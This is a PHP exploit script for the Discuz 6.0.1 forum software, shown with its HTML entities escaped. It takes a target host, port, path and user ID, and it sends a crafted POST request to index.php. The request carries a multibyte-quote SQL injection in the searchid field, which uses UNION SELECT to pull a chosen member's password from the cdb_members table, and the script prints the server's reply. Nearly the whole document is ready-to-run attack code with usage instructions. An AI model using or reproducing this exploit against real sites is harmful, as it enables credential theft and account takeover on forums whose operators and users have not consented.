&lt;?php
error_reporting(E_ALL&amp;E_NOTICE);
print_r(&quot;
+------------------------------------------------------------------+
Exploit discuz6.0.1
Just work as php&gt;=5 &amp; mysql&gt;=4.1
BY  james
+------------------------------------------------------------------+
&quot;);

if($argc&gt;4)
{
 $host=$argv[1];
 $port=$argv[2];
 $path=$argv[3];
 $uid=$argv[4];
}else{
 echo &quot;Usage: php &quot;.$argv[0].&quot; host port path uid\n&quot;;
 echo &quot;host:      target server \n&quot;;
 echo &quot;port:      the web port, usually 80\n&quot;;
 echo &quot;path:      path to discuz\n&quot;;
 echo &quot;uid :      user ID you wanna get\n&quot;;
 echo &quot;Example:\r\n&quot;;
 echo &quot;php &quot;.$argv[0].&quot; localhost 80 1\n&quot;;
 exit;
}

$content =&quot;action=search&amp;searchid=22%cf&#039;UNION SELECT 1,password,3,password/**/from/**/cdb_members/**/where/**/uid=&quot;.$uid.&quot;/*&amp;do=submit&quot;;

$data = &quot;POST /&quot;.$path.&quot;/index.php&quot;.&quot; HTTP/1.1\r\n&quot;;
$data .= &quot;Accept: */*\r\n&quot;;
$data .= &quot;Accept-Language: zh-cn\r\n&quot;;
$data .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$data .= &quot;User-Agent: wap\r\n&quot;;
$data .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;
$data .= &quot;Content-length: &quot;.strlen($content).&quot;\r\n&quot;;
$data .= &quot;Connection: Close\r\n&quot;;
$data .= &quot;\r\n&quot;;
$data .= $content.&quot;\r\n\r\n&quot;;
$ock=fsockopen($host,$port);
if (!$ock) {
 echo &#039;No response from &#039;.$host;
 die;
}
fwrite($ock,$data);
while (!feof($ock)) {
   echo fgets($ock, 1024);
}
?&gt;

